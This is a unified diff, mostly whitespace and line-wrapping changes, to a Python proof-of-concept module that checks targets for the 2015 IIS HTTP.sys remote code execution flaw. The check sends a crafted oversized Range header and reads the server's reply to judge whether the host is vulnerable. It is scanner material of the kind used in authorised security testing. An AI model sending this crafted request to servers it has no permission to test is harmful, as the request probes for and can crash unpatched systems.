@@ -6,11 +6,12 @@ import socket
 import random
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'IIS_0001_p' # 平台漏洞编号，留空
+    vuln_id = 'IIS_0001_p'  # 平台漏洞编号，留空
     name = 'IIS HTTP.sys 远程代码执行漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-04-14'  # 漏洞公布时间
     desc = '''
         远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。
@@ -26,13 +27,15 @@ class Vuln(ABVuln):
         Windows server 2008
         Windows server 2012'''  # 漏洞应用版本
 
+
 def _init_user_parser(self):  # 定制命令行参数
-        self.user_parser.add_option('-p','--port',
-                                    action='store', dest='port', type=int, default=80,
-                                    help='request port.')
-        self.user_parser.add_option('--timeout',
-                                    action='store', dest='timeout', type=int, default=5,
-                                    help='request timeout.')
+    self.user_parser.add_option('-p', '--port',
+                                action='store', dest='port', type=int, default=80,
+                                help='request port.')
+    self.user_parser.add_option('--timeout',
+                                action='store', dest='timeout', type=int, default=5,
+                                help='request timeout.')
+
 
 class Poc(ABPoc):
     poc_id = 'b511340b-8b3e-4480-84a3-a66a71ac08ea'
@@ -46,8 +49,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #获取地址、端口、超时时间
+
+            # 获取地址、端口、超时时间
             #target = args['options']['target']
             #port = args['options']['port']
             #timeout = args['options']['timeout']
@@ -55,7 +58,7 @@ class Poc(ABPoc):
             o = urlparse.urlparse(self.target)
             port = o.port if o.port else 80
             target = o.hostname
-                
+
             headers = {
                 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
             }
@@ -66,7 +69,8 @@ class Poc(ABPoc):
             else:
                 url = 'http://%s:%d' % (target, port)
 
-            r = requests.get(url, verify=False, headers=headers, timeout=timeout)
+            r = requests.get(url, verify=False,
+                             headers=headers, timeout=timeout)
             if not r.headers.get('server') or "Microsoft" not in r.headers.get('server'):
                 pass
                 return None
@@ -76,11 +80,12 @@ class Poc(ABPoc):
                 'Host': 'stuff',
                 'Range': 'bytes=0-' + hexAllFfff,
             })
-            r = requests.get(url, verify=False, headers=headers, timeout=timeout)
+            r = requests.get(url, verify=False,
+                             headers=headers, timeout=timeout)
             if "Requested Range Not Satisfiable" in r.content:
                 #print "[+] Looks Vulnerability!"
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                            target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
                 #args['success'] = True
                 #args['poc_ret']['vulnerability'] = '%s:%d' % (target, port)
             elif "The request has an invalid header name" in r.content:
@@ -96,6 +101,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
